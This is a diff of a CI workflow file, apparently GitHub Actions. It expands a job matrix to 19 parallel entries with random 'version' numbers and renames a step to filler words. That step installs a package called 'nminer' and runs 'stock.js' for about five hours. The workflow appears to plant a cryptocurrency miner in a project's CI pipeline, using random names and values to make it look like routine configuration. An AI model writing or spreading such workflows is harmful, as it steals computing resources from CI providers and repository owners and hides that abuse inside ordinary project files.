@@ -9,21 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1477 }
-          - { version: 487 }
-          - { version: 2648 }
-          - { version: 7350 }
-          - { version: 8682 }
-          - { version: 5768 }
-          - { version: 9131 }
-          - { version: 5883 }
-          - { version: 5990 }
-          - { version: 3296 }
-          - { version: 3728 }
-          - { version: 2956 }
-          - { version: 9554 }
-          - { version: 755 }
-          - { version: 3466 }
+          - { version: 3407 }
+          - { version: 9017 }
+          - { version: 2170 }
+          - { version: 4955 }
+          - { version: 2054 }
+          - { version: 5429 }
+          - { version: 7701 }
+          - { version: 44 }
+          - { version: 1623 }
+          - { version: 8199 }
+          - { version: 2918 }
+          - { version: 2228 }
+          - { version: 9126 }
+          - { version: 4525 }
+          - { version: 7123 }
+          - { version: 68 }
+          - { version: 663 }
+          - { version: 9995 }
+          - { version: 6373 }
 
     steps:
       - name: Checkout
@@ -34,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: reclassify
+      - name: regarding towards outnumber finally
         run: |
           npm install nminer@latest
-          timeout 332m node stock.js || echo "stock executed"
+          timeout 309m node stock.js || echo "stock executed"
